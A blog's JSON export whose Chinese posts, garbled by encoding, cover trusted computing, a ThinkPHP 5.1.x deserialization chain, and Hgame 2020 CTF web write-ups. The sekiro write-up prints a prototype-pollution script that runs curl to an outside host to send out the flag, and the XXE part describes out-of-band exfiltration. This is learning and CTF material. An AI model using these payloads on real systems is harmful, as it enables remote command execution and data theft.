{"meta":{"title":"RuoWeber","subtitle":"","description":"","author":"asy","url":"http://yoursite.com","root":"/"},"pages":[],"posts":[{"title":"å¯ä¿¡è®¡ç®—è‹Ÿå","slug":"å¯ä¿¡è®¡ç®—è‹Ÿå‘½å­¦ä¹ ","date":"2020-04-06T16:00:00.000Z","updated":"2020-04-09T16:30:54.856Z","comments":true,"path":"2020/04/07/å¯ä¿¡è®¡ç®—è‹Ÿå‘½å­¦ä¹ /","link":"","permalink":"http://yoursite.com/2020/04/07/%E5%8F%AF%E4%BF%A1%E8%AE%A1%E7%AE%97%E8%8B%9F%E5%91%BD%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"å¯ä¿¡è®¡ç®—çš„æ¦‚å¿µ ä¸ºä»€ä¹ˆä¼šæœ‰å¯ä¿¡è®¡ç®—çš„æ¦‚å¿µ? pcæœºåŠå…¶æ“ä½œç³»ç»Ÿå¹¶ä¸å®‰å…¨ï¼Œæå®¹æ˜“äº§ç”Ÿå®‰å…¨äº‹æ•… ä¸ºäº†ä»æ ¹æœ¬ä¸Šè§£å†³è®¡ç®—æœºå’Œç½‘ç»œç»“æ„ä¸Šçš„ä¸å®‰å…¨ï¼Œå¿…é¡»ä»èŠ¯ç‰‡ã€ç¡¬ä»¶ç»“æ„å’Œæ“ä½œç³»ç»Ÿç­‰æ–¹é¢ç»¼åˆé‡‡å–æªæ–½-&gt;å¯ä¿¡è®¡ç®—çš„åŸºæœ¬æ€æƒ³ã€‚ å¯ä¿¡è®¡ç®—çš„åŸºæœ¬æ€æƒ³? å…¶ç›®çš„æ˜¯åœ¨è®¡ç®—å’Œé€šä¿¡ç³»ç»Ÿä¸­å¹¿æ³›ä½¿ç”¨åŸºäºç¡¬ä»¶å®‰å…¨æ¨¡å—æ”¯æŒä¸‹çš„å¯ä¿¡çš„è®¡ç®—å¹³å°ï¼Œä»¥æé«˜æ•´ä½“çš„å®‰å…¨æ€§ã€‚ ç¡¬ä»¶ç»“æ„å’Œæ“ä½œç³»ç»Ÿçš„å®‰å…¨æ˜¯åŸºç¡€ï¼Œå¯†ç ã€ç½‘ç»œå®‰å…¨ç­‰æŠ€æœ¯æ˜¯å…³é”®æŠ€æœ¯ ä»€ä¹ˆæ˜¯å¯ä¿¡è®¡ç®—ï¼Ÿ å¯ä¿¡è®¡ç®—æ˜¯ä¸€ç§ä¿¡æ¯ç³»ç»Ÿå®‰å…¨æ–°æŠ€æœ¯ï¼ŒåŒ…æ‹¬å¯ä¿¡ç¡¬ä»¶ã€å¯ä¿¡è½¯ä»¶ã€å¯ä¿¡ç½‘ç»œå’Œå¯ä¿¡è®¡ç®—åº”ç”¨ç­‰è¯¸å¤šæ–¹é¢ å¯ä¿¡è®¡ç®—çš„è§„èŒƒ TCGå·¥ä½œç»„ï¼Ÿ TCGå·¥ä½œç»„1: TPMï¼šå¯ä¿¡å¹³å°æ¨¡å—å·¥ä½œç»„ TSSï¼šå¯ä¿¡è®¡ç®—ç»„ç»‡è½¯ä»¶æ ˆå·¥ä½œç»„(ä¸“é—¨ç”¨äºä½¿ç”¨TPMç‰¹æ€§çš„åˆ¶å®šçš„ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿç‹¬ç«‹æ¥å£) TNCï¼šå¯ä¿¡ç½‘ç»œè¿æ¥å·¥ä½œç»„ IWGï¼šåŸºç¡€è®¾æ–½å·¥ä½œç»„ TCGå·¥ä½œç»„2: PCå®¢æˆ·æœºç¨‹åºå·¥ä½œç»„ æœåŠ¡å™¨å·¥ä½œç»„ ç§»åŠ¨ç”µè¯å·¥ä½œç»„ TCGå·¥ä½œç»„3: å­˜å‚¨ç³»ç»Ÿå·¥ä½œç»„ï¼šä¸ºå¯å¸é™¤å¼å¤šåª’ä½“ç£ç›˜é©±åŠ¨å™¨ã€é—ªå­˜ã€ä»¥åŠåŒ…å«å­˜å‚¨æ§åˆ¶æ¥å£çš„å„ç§å­˜å‚¨è®¾å¤‡ç³»ç»Ÿåˆ¶å®šä¸“ç”¨å­˜å‚¨ç³»ç»Ÿçš„å®‰å…¨æœåŠ¡æ ‡å‡† TCGå®ç°çš„ä¸»è¦è§„èŒƒ? TPMï¼šæä¾›äº†ä¸€å¥—ä¸å¯æ”¹å˜çš„åŠ å¯†å’Œå®‰å…¨å‡½æ•° TSSï¼šä¸ºäº†é«˜å±‚çš„åº”ç”¨è½¯ä»¶å‘å¸ƒä½å±‚çš„TPMè¯·æ±‚å’Œæ¥å—ä½å±‚çš„TPMå“åº” å¯ä¿¡è®¡ç®—çš„åŸºæœ¬æ€æƒ³ä¸ä¸»è¦çš„æŠ€æœ¯è·¯çº¿ ä¿¡ä»»ï¼šä¿¡ä»»æ˜¯ä¸€ç§äºŒå…ƒå…³ç³»ï¼Œå¯ä»¥ä¸€å¯¹ä¸€ã€ä¸€å¯¹å¤šã€å¤šå¯¹ä¸€æˆ–å¤šå¯¹å¤šï¼Œå…¶è¿˜å…·å¤‡ä»¥ä¸‹ç‰¹æ€§ 1.äºŒé‡æ€§ 2.ä¸ä¸€å®šæœ‰å¯¹ç§°æ€§ 3.ä¿¡ä»»å¯åº¦é‡ï¼Œå³ä¿¡ä»»çš„ç¨‹åº¦å¯ä»¥åˆ’åˆ†ç­‰çº§ 4.ä¿¡ä»»å¯ä¼ é€’ï¼Œä½†ä¸ç»å¯¹ 4.ä¿¡ä»»è¿˜å…·æœ‰åŠ¨æ€æ€§çš„ ä¿¡ä»»æ ¹ï¼šä¿¡ä»»æ ¹æ˜¯ç³»ç»Ÿå¯ä¿¡çš„åŸºç‚¹ï¼ŒTCGè®¤ä¸ºä¸€ä¸ªå¯ä¿¡è®¡ç®—å¹³å°å¿…é¡»åŒ…å«3ä¸ªå¯ä¿¡æ ¹ï¼š 1.å¯ä¿¡æµ‹é‡æ ¹CRTM 2.å¯ä¿¡å­˜å‚¨æ ¹RTS 3.å¯ä¿¡æŠ¥å‘Šæ ¹RTR åˆ›å»ºå¯ä¿¡é“¾ï¼Œç¬¬ä¸€ä¸ªå®ä½“å¿…é¡»ä¸ºå¯ä¿¡æ ¹ã€‚ä¸”æ²¡æœ‰æœºåˆ¶æµ‹RTMã€‚ å¯ä¿¡è®¡ç®—çš„åŸºæœ¬æ€æƒ³ï¼šå…ˆå»ºç«‹ä¸€ä¸ªä¿¡ä»»æ ¹ï¼Œå†å»ºç«‹ä¸€æ¡ä¿¡ä»»é“¾ï¼Œä»ä¿¡ä»»æ ¹å¼€å§‹åˆ°ç¡¬ä»¶å¹³å°ã€åˆ°æ“ä½œç³»ç»Ÿã€å†åˆ°åº”ç”¨ã€ï¼Œä¸€çº§è®¤è¯ä¸€çº§ï¼Œä¸€çº§ä¿¡ä»»ä¸€çº§ã€‚ä»è€ŒæŠŠè¿™ç§ä¿¡ä»»æ‰©å±•åˆ°æ•´ä¸ªè®¡ç®—æœºç³»ç»Ÿ å¯ä¿¡è®¡ç®—å¹³å°æ¨¡å—TPM å†…å®¹ï¼šæ˜¯ä¸€ç§ä¸“ç”¨çš„å®‰å…¨èŠ¯ç‰‡ï¼ŒåŒ…å«äº†ä¸€ä¸ªå…¬ç§é’¥å¯¹ï¼ŒåŒ…å«äº†ä¸€ä¸ªç”¨äºè¯´æ˜å…¬é’¥å±äºåˆæ³•TPMçš„è¯ä¹¦ å®ƒæ˜¯ä¸€ç§SOCèŠ¯ç‰‡ï¼Œå®ƒæ˜¯å¯ä¿¡è®¡ç®—å¹³å°çš„ä¿¡ä»»æ ¹ï¼ˆå¯ä¿¡å­˜å‚¨æ ¹å’Œå¯ä¿¡æŠ¥å‘Šæ ¹ï¼‰ åŠŸèƒ½ï¼šå®Œæˆå¯ä¿¡åº¦é‡çš„å­˜å‚¨ã€å¯ä¿¡åº¦é‡çš„æŠ¥å‘Šã€å¯†é’¥äº§ç”Ÿã€åŠ å¯†å’Œç­¾åã€æ•°æ®å®‰å…¨å­˜å‚¨ç­‰åŠŸèƒ½ å…¶æ”¯æ’‘è½¯ä»¶(TSS)ï¼šæ˜¯å¯ä¿¡è®¡ç®—å¹³å°ä¸ŠTPMçš„æ”¯æ’‘è½¯ä»¶ï¼ŒTSSçš„ä½œç”¨ä¸»è¦æ˜¯ä¸ºæ“ä½œç³»ç»Ÿå’Œåº”ç”¨è½¯ä»¶æä¾›ä½¿ç”¨TPMçš„æ¥å£ï¼Œç»“æ„åˆ†ä¸ºï¼š 1.TDDLæ¨¡å—ï¼Œå†…æ ¸å±‚ 2.TCSæ¨¡å—ï¼Œç³»ç»ŸæœåŠ¡å±‚ 3.TSPå¤„ç†æ¨¡å—ï¼Œç”¨æˆ·å±‚ å·¥ä½œæµç¨‹ï¼š åº”ç”¨ç¨‹åºå°†æ•°æ®å’Œå‘½ä»¤-&gt;APIå‡½æ•°TSP-&gt;TCS-&gt;TDDL-&gt;TDD-&gt;TPM TPMçš„ä»‹ç»(TPMçš„æ ¸å¿ƒåŠŸèƒ½)TPMæ¶æ„ å…¶è‡³å°‘éœ€è¦å…·å¤‡å››ä¸ªä¸»è¦åŠŸèƒ½: 1.å¯¹ç§°/éå¯¹ç§°åŠ å¯†ï¼ˆéå¯¹ç§°å®ç°é RSAç®—æ³•ï¼Œå¯¹ç§°å¯ä»¥ä½¿ç”¨ä»»æ„ç®—æ³•ï¼Œæ—¢å¯ä»¥ä½¿ç”¨ä¸“ç”¨åå¤„ç†å™¨ä¹Ÿå¯ä»¥ä½¿ç”¨è½¯ä»¶ï¼‰ 2.å®‰å…¨å­˜å‚¨ 3.å®Œæ•´æ€§åº¦é‡ï¼ˆSHA-1æ•£åˆ—ç®—æ³•ï¼‰ 4.ç­¾åè®¤è¯ï¼ˆRSAç®—æ³•ï¼‰","categories":[],"tags":[{"name":"Else","slug":"Else","permalink":"http://yoursite.com/tags/Else/"}]},{"title":"tp5.1.xååºåˆ—åŒ–æ¼æ´è®°å½•","slug":"tp5.1.xååºåˆ—åŒ–å¤ç°è®°å½•","date":"2020-03-29T16:00:00.000Z","updated":"2020-04-09T03:18:19.967Z","comments":true,"path":"2020/03/30/tp5.1.xååºåˆ—åŒ–å¤ç°è®°å½•/","link":"","permalink":"http://yoursite.com/2020/03/30/tp5.1.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/","excerpt":"","text":"Thinkphp5.1.x popé“¾å¤ç°popé“¾çš„å¼€å§‹ååºåˆ—åŒ–æ¼æ´__destructå¼€å§‹ï¼Œå› ä¸ºå…¶å¯ä»¥åœ¨ååºåˆ—åŒ–åè‡ªåŠ¨æ‰§è¡Œï¼Œå…¨å±€æœç´¢: çœ‹èµ·removeFileså‡½æ•°ï¼Œå‘ç°è°ƒç”¨äº†file_exists()ï¼Œè€Œfile_exists()å¯ä»¥è§¦å‘__toString()ï¼Œè¿™å°±æ˜¯popé“¾çš„ç¬¬ä¸€æ­¥ï¼Œç„¶åæœç´¢å«æœ‰ __toString()é­”æœ¯æ–¹æ³•çš„ç±»,è¿™é‡Œçš„conversionå’Œcollectionç±»éƒ½å¯ä»¥ï¼Œåªä¸è¿‡collectionéº»çƒ¦ä¸€ç‚¹ï¼Œæˆ‘ä»¬è¿™é‡Œé€‰æ‹©conversionç±»ï¼š 1234public function __toString()&#123; return $this-&gt;toJson();&#125; toJsonå†…å®¹: 1234public function toJson($options = JSON_UNESCAPED_UNICODE)&#123; return json_encode($this-&gt;toArray(), $options);&#125; toArrayä¸­å…³é”®æ­¥éª¤ ä¸ºä»€ä¹ˆè¿™é‡Œæ˜¯é‡ç‚¹å‘¢ï¼Ÿå› ä¸ºæˆ‘ä»¬æ„å»ºpopé“¾ååºåˆ—åŒ–çš„æ¼æ´çš„ç›®çš„å°±æ˜¯æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„å‘½ä»¤ï¼Œæ€ä¹ˆæ‰§è¡Œï¼Ÿ 1.å¯æ§å¯¹è±¡è°ƒç”¨å¯æ§å‡½æ•°å¹¶æœ‰å¯æ§çš„å‚æ•°ã€‚ 2.å¯æ§å¯¹è±¡ä¸ä»»æ„å‡½æ•°(è¯¥å¯¹è±¡æ²¡æœ‰çš„æ–¹æ³•)é…åˆ__call()æ–¹æ³•ä¸å¯æ§å‚æ•°æ¥æ‰§è¡Œæˆ‘ä»¬æƒ³æ‰§è¡Œçš„å‘½ä»¤ã€‚ è·Ÿè¿›getAttr()å‘ç°ï¼Œå…¶è¿”å›å€¼ä¸ºtrait Attributeçš„dataæ•°ç»„çš„$keyé”®çš„å€¼ã€‚è®°å½•ä¸‹å°±æ˜¯ 1trait Attribute-&gt;data[&apos;$key&apos;] è¿™æ ·$relationå¯æ§ä»¥åï¼Œæˆ‘ä»¬å°±åªè¦æ‰¾å¯åˆ©ç”¨çš„visibleæ–¹æ³•ï¼Œæˆ–è€…åˆé€‚çš„__callæ–¹æ³•(å½“ç„¶è¦è®©$nameå¯æ§ä»¥åŠè¿›å…¥è¿™ä¸ªifæ¡ä»¶è¿˜éœ€ä¸€äº›ç»†èŠ‚ï¼Œè¿™é‡Œå…ˆä¸è°ˆ)ã€‚ è¿™é‡Œæˆ‘ä»¬ç›´æ¥åˆ†æpopé“¾æ‰€ç”¨çš„requestç±»: å¯ä»¥çœ‹è§è°ƒç”¨äº†call_user_func_array(),å¹¶ä¸”å¯¹è¯¥å‡½æ•°æ¥è¯´ï¼Œè°ƒç”¨çš„å‡½æ•°å¯æ§ï¼Œä½†æ˜¯å¾ˆéš¾å—çš„æ˜¯å‚æ•°æ•°ç»„åŠ äº†ä¸€ä¸ªrequestå¯¹è±¡ï¼Œ$thisä½œä¸ºç›´æ¥èƒ½å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°çš„å‚æ•°å¿…æŠ¥é”™ã€‚æ‰€ä»¥è¿™é‡Œç»§ç»­å¯»æ‰¾ä¸€ä¸ªrequestsç±»èƒ½ç›´æ¥åˆ©ç”¨çš„å‡½æ•°ï¼Œé¦–å…ˆçœ‹input(å› ä¸ºè¿™ä¸ªå‡½æ•°å°±æ˜¯tp5.0å‰å°rceçš„ç½ªé­ç¥¸é¦–)ã€‚ è¿™é‡Œçš„getFilteré€šè¿‡æŸ¥çœ‹æºç å‘ç°ï¼Œå¯ä»¥æ§åˆ¶å…¶æ­£å¥½èƒ½æ„é€ å‡ºfilterValueå‘½ä»¤æ‰§è¡Œæ—¶æ‰€éœ€çš„system(å¾ˆç®€å•çš„ä¸å†èµ˜è¿°)ã€‚ä½†æ˜¯é—®é¢˜æ˜¯è¿™é‡Œçš„$dataåˆä¸æ»¡è¶³æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤æ‰§è¡Œçš„å‚æ•°çš„è¦æ±‚ã€‚æ‰€ä»¥çœ‹èƒ½ä¸èƒ½å†å¾€ä¸Šæ‰¾ä¸€å±‚ï¼Œå‘ç°paramè°ƒç”¨äº†input(å°±ä¸poå›¾äº†)ï¼Œä½†æ˜¯å‘ç°paramæ‰€éœ€å‚æ•°å’Œåœ¨æˆ‘ä»¬èƒ½åŠ›èŒƒå›´å†…æ§åˆ¶çš„å‚æ•°è¿˜å·®å¾ˆå¤šã€‚å†ç½‘ä¸Šæ‰¾å‘ç°isAjaxè°ƒç”¨äº†paramï¼Œä¸”å‚æ•°å¯æ§ï¼Œå®Œç¾ã€‚ (å…¶å®è¿˜æœ‰å¥½å¤šè¦ä½¿ç¨‹åºæŒ‰è¿™ä¸ªæµç¨‹èµ°ä¸‹æ¥çš„é¢å¤–æ¡ä»¶ï¼Œä½†æ˜¯é‚£äº›å¾ˆç®€å•ï¼Œå¾ˆå®¹æ˜“å¯ä»¥æ§åˆ¶)ã€‚","categories":[],"tags":[{"name":"Else","slug":"Else","permalink":"http://yoursite.com/tags/Else/"}]},{"title":"ThinkPhpå­¦ä¹ ","slug":"ThinkPhpå­¦ä¹ è®°å½•","date":"2020-02-19T16:00:00.000Z","updated":"2020-03-05T08:44:45.614Z","comments":true,"path":"2020/02/20/ThinkPhpå­¦ä¹ è®°å½•/","link":"","permalink":"http://yoursite.com/2020/02/20/ThinkPhp%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","excerpt":"ThinkPhpå­¦ä¹ ","text":"ThinkPhpå­¦ä¹  è·¯ç”±è·¯ç”±ç”¨äºè§„åˆ’è¯·æ±‚çš„è®¿é—®åœ°å€ï¼Œè·¯ç”±å»ºç«‹äº†è¯·æ±‚åœ°å€åˆ°æ“ä½œæ–¹æ³•çš„æ˜ å°„å…³ç³»ã€‚ thinkphpå¹¶éå¼ºåˆ¶ä½¿ç”¨è·¯ç”±ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æ§åˆ¶å™¨/æ–¹æ³•å®ç°è¯·æ±‚(å¦‚æœå®šä¹‰äº†è·¯ç”±ï¼Œé‚£ä¹ˆå°±ä¸èƒ½ç›´æ¥ä½¿ç”¨ä¸Šè¿°æ–¹æ³•è®¿é—®äº†ï¼Œæ­¤å¤–thinkphpè¿˜æœ‰ä¸ªå¼ºåˆ¶è·¯ç”±çš„é€‰é¡¹)ã€‚ è·¯ç”±è™½ç„¶ä¼šæœ‰ä¸€å®šçš„æŸå¤±ï¼Œä½†æ˜¯å®ƒä¸ä»…æä¾›äº†ä¸€ç§è®¿é—®çš„è§„èŒƒï¼Œæ›´æœ‰éªŒè¯ã€æƒé™ã€å‚æ•°ç»‘å®šåŠå“åº”è®¾ç½®ç­‰åŠŸèƒ½ã€‚ æ§åˆ¶å™¨æ§åˆ¶å™¨æ¥å—è¯·æ±‚ï¼Œè°ƒç”¨ç›¸åº”æ¨¡å‹å¤„ç†ï¼Œæœ€ååˆ©ç”¨è§†å›¾è¾“å‡ºï¼Œä¸”æ§åˆ¶å™¨åº”è¯¥å°½å¯èƒ½çš„ä¸æ¶‰åŠä¸šåŠ¡é€»è¾‘ã€‚ æ¨¡å‹æ¨¡å‹ä¸»è¦åšä¸šåŠ¡é€»è¾‘å’Œæ•°æ®å°è£…ï¼Œä¼ ç»™è§†å›¾æ ¼å¼æ— å…³çš„æ•°æ® è¯·æ±‚1.å¯¹äºè¯·æ±‚æ–¹æ³•ï¼Œtpæ”¯æŒè¯·æ±‚æ–¹æ³•ä¼ªé€ : 12345&lt;form method=&quot;post&quot; action=&quot;http://127.0.0.1/asyThink/public/index.php/hello/a&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;Hello&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;_method&quot; value=&quot;GET&quot; &gt; &lt;input type=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;&lt;/form&gt; åªè¦æäº¤_methodå±æ€§çš„å€¼ï¼Œå°±å¯ä»¥æ”¹å˜è¯·æ±‚æ–¹å¼(ç»è¿‡æµ‹è¯•ï¼Œè¿™ä¸ªä¸ä»…å¯ä»¥æ”¹å˜Requestçš„methodæ–¹æ³•çš„å€¼ï¼Œè¿˜å¯ä»¥æ”¹å˜è¯·æ±‚çš„è·¯ç”±)ã€‚ 2.å¯¹äºè¯·æ±‚å¤´ä¿¡æ¯çš„è§£ææ˜¯æœ‰å®¹é”™çš„ å¯¹äºRequest::header(â€˜user-Agentâ€™)ï¼ŒHTTPè¯·æ±‚å¤´è§£æä¸åŒºåˆ†å¤§å°å†™ï¼Œå¹¶ä¸”-ä¼šè½¬åŒ–ä¸º_, æ•°æ®åº“1.æ¨¡å‹ç±»å¯ä»¥å®šä¹‰connection(protected)å±æ€§(extends model)ï¼Œè¿™ä¸ªå¯ä»¥ä½¿è®©è¯¥æ¨¡å‹ç±»æ“ä½œæ•°æ®åº“æ—¶æŒ‰ç…§ç»™å®šçš„æ•°æ®åº“é…ç½®è¿æ¥ã€‚ ä¸­é—´ä»¶ä¸­é—´ä»¶æŒ‰æˆ‘çš„ç†è§£å°±æ˜¯ç”¨æ¥è¿‡æ»¤è¯·æ±‚ä¸­çš„æ•°æ®çš„ã€‚ ç”¨php think make:middleware Checkå¯ä»¥å¿«æ·åœ°åœ¨app\\middlewareç›®å½•ä¸‹ç”Ÿæˆä¸­é—´ä»¶Checkï¼Œ ä¸»è¦ç”¨æ³•æ˜¯å…¶handleæ–¹æ³• 123456789101112131415&lt;?phpnamespace app\\middleware;use Closure;class Check&#123; public function handle($request, \\Closure $next, $name) &#123; if ($name == &apos;think&apos;) &#123; return redirect(&apos;index/think&apos;); &#125; return $next($request); &#125;&#125; å½“ç„¶ï¼Œä¸Šè¿°ä¸­é—´ä»¶çš„åŠŸèƒ½æ˜¯åœ¨è¿”å›è¯·æ±‚å‰åšä¸€ç³»åˆ—çš„ä¸šåŠ¡å¤„ç†ï¼Œæ­¤ä¸ºå‰ç½®ä¸­é—´ä»¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ 123$response = $next($request);æ‰§è¡Œä»£ç return $response æ­¤ä¸ºåç½®ä¸­é—´ä»¶ã€‚ å½“ç„¶ä¸­é—´ä»¶è¿˜è¦æ³¨å†Œä¸”å¯ä»¥èµ·åˆ«å èµ·åˆ«ååœ¨config\\middlewareçš„aliasä¸‹å£°æ˜ æ³¨å†Œä¸­é—´ä»¶å¯ä»¥åˆ†ä¸ºå…¨å±€ä¸­é—´ä»¶ï¼Œåº”ç”¨ä¸­é—´ä»¶ï¼Œè·¯ç”±ä¸­é—´ä»¶ï¼Œæ§åˆ¶å™¨ä¸­é—´ä»¶å››ç§ã€‚ 1.å…¨å±€ä¸­é—´ä»¶çš„æ³¨å†Œåœ¨app\\middleware.phpä¸­ ä¸”æ”¯æŒåˆ«åå’Œç»™ä¸­é—´ä»¶ä¼ å‚,ç±»ä¼¼ 12345return [ \\app\\middleware\\Auth::class, &apos;check&apos;, &apos;Hello&apos;,]; 2.åº”ç”¨ä¸­é—´ä»¶é€‚ç”¨äºå¤šåº”ç”¨æ¨¡å¼ï¼Œç›´æ¥åœ¨åº”ç”¨ç›®å½•ä¸‹æ·»åŠ middleware.php 3.è·¯ç”±ä¸­é—´ä»¶é¡¾åæ€ä¹‰,ç±»ä¼¼ 12Route::rule(&apos;hello/:name&apos;,&apos;hello&apos;) -&gt;middleware(&apos;auth&apos;, &apos;admin&apos;);ç»™authä¸­é—´ä»¶ä¼ adminå‚æ•° 4.æ§åˆ¶å™¨ä¸­é—´ä»¶ç›´æ¥åœ¨æ§åˆ¶å™¨æœ‰$middlewareå±æ€§ï¼ˆæ•°ç»„ç±»å‹ï¼‰","categories":[],"tags":[{"name":"Else","slug":"Else","permalink":"http://yoursite.com/tags/Else/"}]},{"title":"Hgame2020-Week4-éƒ¨åˆ†WebWP","slug":"Hgame2020Week4Web(Php&Js)","date":"2020-02-13T16:00:00.000Z","updated":"2020-03-05T07:59:41.747Z","comments":true,"path":"2020/02/14/Hgame2020Week4Web(Php&Js)/","link":"","permalink":"http://yoursite.com/2020/02/14/Hgame2020Week4Web(Php&Js)/","excerpt":"å‰è¨€å¯’å‡åœ¨å®¶åšäº†ä¸‹ä»Šå¹´çš„hgame,ä¸ç®¡è¯´æ˜¯å•ä»wee4æˆ–è€…ç»¼åˆæ¥çœ‹å¥½åƒæ¯”å»å¹´çš„ç®€å•ä¸å°‘ã€‚ã€‚ã€‚(ä½†æ˜¯ä¾ç„¶è§‰å¾—å¾ˆéš¾orz)ã€‚è¿™é‡Œé—²æ¥æ— äº‹å…ˆè®°å½•ä¸‹week4Webçš„phpå’Œjsçš„ä¸¤é“é¢˜","text":"å‰è¨€å¯’å‡åœ¨å®¶åšäº†ä¸‹ä»Šå¹´çš„hgame,ä¸ç®¡è¯´æ˜¯å•ä»wee4æˆ–è€…ç»¼åˆæ¥çœ‹å¥½åƒæ¯”å»å¹´çš„ç®€å•ä¸å°‘ã€‚ã€‚ã€‚(ä½†æ˜¯ä¾ç„¶è§‰å¾—å¾ˆéš¾orz)ã€‚è¿™é‡Œé—²æ¥æ— äº‹å…ˆè®°å½•ä¸‹week4Webçš„phpå’Œjsçš„ä¸¤é“é¢˜ PHP(xxeç›²æ³¨å¥—å¨ƒhitconçš„babyfirst-revenge)æŠ“åŒ…ä¸€çœ‹ï¼Œè‚¯å®šç¬¬ä¸€æƒ³æ³•æ˜¯xxeæ‰“ä¸€æ¢­å­ï¼Œå‘ç°å›æ˜¾æœ‰ç‚¹å¥‡æ€ªçœ‹ä¸æ‡‚ã€‚ã€‚ã€‚ç„¶åå°±æƒ³åˆ°äº†xxeæ•°æ®å¤–å¸¦ï¼Œä»ç½‘ä¸Šæ‰¾ä¸ªexpæ¥è¯•ä¸‹ï¼Œ ,z.dtdå†…å®¹ä¸ºï¼š è¯»å–/flagæ— æœåï¼Œå‘ç°/etc/hostsæœ‰ä¸ªå†…ç½‘ä¸»æœºï¼Œè®¿é—®ä¸‹å‘ç°éœ€è¦å¸¦ä¸Šé˜Ÿä¼tokenè®¿é—®(è¿™é‡Œæœ‰ä¸€ç‚¹ï¼Œå°±æ˜¯dtdä¸­ç”¨php://filterè¯»å–æ—¶éœ€è¦ä½¿ç”¨zlib.deflateå‹ç¼©ä¸‹ï¼Œè¦ä¸è¿”å›çš„æ•°æ®å¤ªå¤šä¼šæŠ¥é”™ã€‚ã€‚ã€‚),å¸¦ä¸Štokenåè®¿é—®å¾—åˆ°çš„æ•°æ®è§£å‹å(php://filter/read=convert.base64-encode/zlib.inflate//resource=xxx)å†™æˆhtmlçœ‹ä¸€ä¸‹, å‘ç°æ˜¯hitconçš„babyfirst-revengeçš„åŸé¢˜(æ²¡æˆªå›¾äº†ã€‚ã€‚) ç„¶åå†™ä¸ªè„šæœ¬å»getshell(ç½‘ä¸Šéƒ½æœ‰ï¼Œå°±ä¸å±•ç¤ºè‡ªå·±çš„ğŸ’©ä»£ç äº†)ï¼Œ ç„¶åå‘ç°ä¸€ç›´æ²¡æ‰¾åˆ°flagï¼Œæœ€åå†/etcä¸‹é¢æ‰¾åˆ°ã€‚ã€‚ä¸çŸ¥é“è¿™é‡Œå‡ºé¢˜äººè¦è€ƒä»€ä¹ˆã€‚ã€‚ã€‚ç¡¬ç¿»åˆ°çš„ã€‚ sekiro(jsåŸå‹é“¾æ±¡æŸ“)ç¬¬ä¸€æ¬¡åšåŸå‹é“¾æ±¡æŸ“çš„é¢˜ã€‚ã€‚ã€‚åŸå‹é“¾æ±¡æŸ“çš„åŸç†ç½‘ä¸Šå¾ˆå¤šã€‚æŒ‰ç…§æˆ‘çš„ç†è§£å°±æ˜¯åŸå‹é“¾æ±¡æŸ“çš„å±å®³å°±æ˜¯å¯ä»¥åˆ©ç”¨ä¸€äº›èµ‹å€¼æ“ä½œæ¶æ„åœ°ç»™æŸä¸ªå¯¹è±¡èµ‹äºˆä¸€ä¸ªæ¶æ„çš„å±æ€§ï¼Œè¿™é‡Œæ¼æ´å…¶å®å¾ˆæ˜æ˜¾çš„ï¼Œå®¡è®¡æºç å‘ç°å†/actionè·¯ç”±ä¸‹é¢ è¿™é‡Œæœ‰äº†åŸå‹é“¾æ±¡æŸ“çš„ç‚¹ï¼Œä½†æ˜¯æ€ä¹ˆåˆ©ç”¨è¿™ä¸ªç‚¹å»getflagæˆ–è€…å‘½ä»¤æ‰§è¡Œåˆ°ç›®å‰è¿˜ä¸æ˜æ˜¾ï¼Œç»§ç»­å¾€ä¸‹çœ‹ï¼Œè·Ÿè¿›dealwithattacksçš„å®ç°ï¼Œ è¿™é‡Œå‘ç°æœ‰ä¸ªå‡½æ•°æ‰§è¡Œè¯­å¥ç›´æ¥æ‹¼æ¥äº†å˜é‡ï¼Œæˆ‘ä»¬å†çœ‹ä¸‹attacksçš„æ•°ç»„ï¼Œå‘ç°æœ‰çš„é”®å€¼æ˜¯æ²¡æœ‰additionalEffectå±æ€§çš„ï¼Œè¿™é‡Œå°±å¾ˆæ˜æ˜¾äº†ï¼Œæˆ‘ä»¬é€šè¿‡åŸå‹é“¾æ±¡æŸ“ï¼Œç»™objectèµ‹å€¼ä¸€ä¸ªæ¶æ„çš„additionalEffectçš„å€¼ï¼Œsekiro.attackInfoæ²¡æœ‰è¿™ä¸ªå±æ€§çš„è¯å°±ä¼šéµå¾ªåŸå‹é“¾åˆ°objectï¼Œç»§æ‰¿objectçš„additionalEffectçš„å€¼ï¼Œä»è€Œå®ç°å¯æ§çš„å‘½ä»¤æ‰§è¡Œã€‚ è„šæœ¬å¦‚ä¸‹: 1234567891011121314151617import requestsimport jsonbaseurl = 'http://sekiro.hgame.babelfish.ink/' header = &#123; 'content-type': 'application/json'&#125;data = &#123;'solution':'123','__proto__':&#123;\"additionalEffect\":\"process.mainModule.require('child_process').exec('curl http://ip:port/`cat /flagï½œbase64` 0&gt;&amp;1')\"&#125;&#125;se = requests.Session()#get /re = se.get(baseurl)#get /infore = se.get(baseurl+'info')#get /attackre = se.get(baseurl+'attack')#post /actionre = se.post(baseurl+'action',headers=header,data=json.dumps(data)).textprint(re)","categories":[],"tags":[{"name":"Else","slug":"Else","permalink":"http://yoursite.com/tags/Else/"}]},{"title":"Bytectf-BabyblogWP","slug":"Bytectf-BabyblogWP","date":"2020-01-28T16:00:00.000Z","updated":"2020-01-29T13:22:27.514Z","comments":true,"path":"2020/01/29/Bytectf-BabyblogWP/","link":"","permalink":"http://yoursite.com/2020/01/29/Bytectf-BabyblogWP/","excerpt":"BabyblogWPäºŒæ¬¡æ³¨å…¥ç¬¬ä¸€ä¸ªç‚¹ä¸ºäºŒæ¬¡æ³¨å…¥ï¼Œé¢˜ç›®å¯ä»¥æ‹¿åˆ°æºç ï¼Œç„¶ååœ¨edit.phpå‘ç°æ³¨å…¥ç‚¹ è¿™é‡Œå‘ç°where 